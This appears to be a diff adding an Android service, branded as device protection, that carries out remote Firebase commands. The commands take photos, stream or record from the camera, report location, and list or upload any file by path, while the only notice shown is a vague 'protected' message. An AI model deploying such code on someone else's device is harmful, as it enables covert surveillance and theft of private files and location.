@@ -1,0 +1,172 @@
+package com.remoteguard.app
+
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.content.Intent
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
+import androidx.core.app.NotificationCompat
+import androidx.lifecycle.LifecycleService
+import com.google.firebase.database.ChildEventListener
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.DatabaseReference
+import com.google.firebase.database.MutableData
+import com.google.firebase.database.Transaction
+
+class RemoteGuardService : LifecycleService() {
+
+    private lateinit var locationManager: LocationManager
+    private lateinit var cameraManager: CameraManager
+    private var commandsRef: DatabaseReference? = null
+    private var commandsListener: ChildEventListener? = null
+    private val heartbeatHandler = Handler(Looper.getMainLooper())
+    private val heartbeatRunnable = object : Runnable {
+        override fun run() {
+            FirebaseHelper.updateLastSeen(this@RemoteGuardService, "service_running")
+            heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL_MS)
+        }
+    }
+
+    override fun onCreate() {
+        super.onCreate()
+        FirebaseHelper.initialize(this)
+        locationManager = LocationManager(this)
+        cameraManager = CameraManager(this)
+        startForeground(NOTIFICATION_ID, createNotification())
+        listenForCommands()
+        heartbeatHandler.post(heartbeatRunnable)
+    }
+
+    private fun createNotification(): Notification {
+        val channelId = "remote_guard_channel"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                channelId, "RemoteGuard Service",
+                NotificationManager.IMPORTANCE_LOW
+            )
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+        }
+        return NotificationCompat.Builder(this, channelId)
+            .setContentTitle("Protected")
+            .setContentText("Your device is protected.")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .build()
+    }
+
+    private fun listenForCommands() {
+        if (commandsListener != null) return
+        commandsRef = FirebaseHelper.getCommandsRef(this).also { ref ->
+            val listener = object : ChildEventListener {
+                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
+                    handleCommandSnapshot(snapshot)
+                }
+
+                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
+                    handleCommandSnapshot(snapshot)
+                }
+
+                override fun onChildRemoved(snapshot: DataSnapshot) = Unit
+                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) = Unit
+                override fun onCancelled(error: DatabaseError) = Unit
+            }
+            commandsListener = listener
+            ref.addChildEventListener(listener)
+        }
+    }
+
+    private fun handleCommandSnapshot(snapshot: DataSnapshot) {
+        val commandId = snapshot.key ?: return
+        val command = snapshot.child("command").getValue(String::class.java) ?: return
+        val status = snapshot.child("status").getValue(String::class.java)
+        if (status != "pending") return
+        claimAndExecuteCommand(commandId, command)
+    }
+
+    private fun claimAndExecuteCommand(commandId: String, command: String) {
+        val cmdRef = FirebaseHelper.getCommandsRef(this).child(commandId)
+        cmdRef.child("status").runTransaction(object : Transaction.Handler {
+            override fun doTransaction(currentData: MutableData): Transaction.Result {
+                val currentStatus = currentData.getValue(String::class.java)
+                return if (currentStatus == "pending") {
+                    currentData.value = "executing"
+                    Transaction.success(currentData)
+                } else {
+                    Transaction.abort()
+                }
+            }
+
+            override fun onComplete(
+                error: DatabaseError?,
+                committed: Boolean,
+                currentData: DataSnapshot?
+            ) {
+                if (!committed || error != null) return
+                executeCommand(command, commandId)
+            }
+        })
+    }
+
+    private fun executeCommand(command: String?, commandId: String) {
+        val cmdRef = FirebaseHelper.getCommandsRef(this).child(commandId)
+
+        try {
+            when {
+                command == "take_photo" -> cameraManager.takePhoto(this)
+                command == "start_stream" -> cameraManager.startStreaming(this)
+                command == "stop_stream" -> cameraManager.stopStreaming()
+                command == "start_video" -> cameraManager.startVideoRecording(this)
+                command == "stop_video" -> cameraManager.stopVideoRecording()
+                command == "switch_camera" -> {
+                    cameraManager.switchCamera(this)
+                    FirebaseHelper.updateLastSeen(this, "camera_switched_${cameraManager.getCurrentCameraName()}")
+                }
+                command == "get_location" -> locationManager.getCurrentLocation {}
+                command == "list_files" -> FileManager.listFiles(this)
+                command?.startsWith("list_files:") == true -> {
+                    val path = command.substringAfter("list_files:")
+                    FileManager.listFiles(this, path)
+                }
+                command?.startsWith("upload_file:") == true -> {
+                    val path = command.substringAfter("upload_file:")
+                    FileManager.uploadFile(this, path)
+                }
+                else -> {
+                    cmdRef.child("status").setValue("failed")
+                    cmdRef.child("error").setValue("Unsupported command: $command")
+                    return
+                }
+            }
+            cmdRef.child("status").setValue("completed")
+        } catch (e: Exception) {
+            cmdRef.child("status").setValue("failed")
+            cmdRef.child("error").setValue(e.message ?: "Command execution failed")
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        super.onStartCommand(intent, flags, startId)
+        FirebaseHelper.initialize(this)
+        listenForCommands()
+        return START_STICKY
+    }
+
+    override fun onDestroy() {
+        commandsRef?.let { ref ->
+            commandsListener?.let { listener ->
+                ref.removeEventListener(listener)
+            }
+        }
+        commandsListener = null
+        commandsRef = null
+        heartbeatHandler.removeCallbacksAndMessages(null)
+        super.onDestroy()
+    }
+
+    companion object {
+        private const val NOTIFICATION_ID = 1
+        private const val HEARTBEAT_INTERVAL_MS = 60_000L
+    }
+}
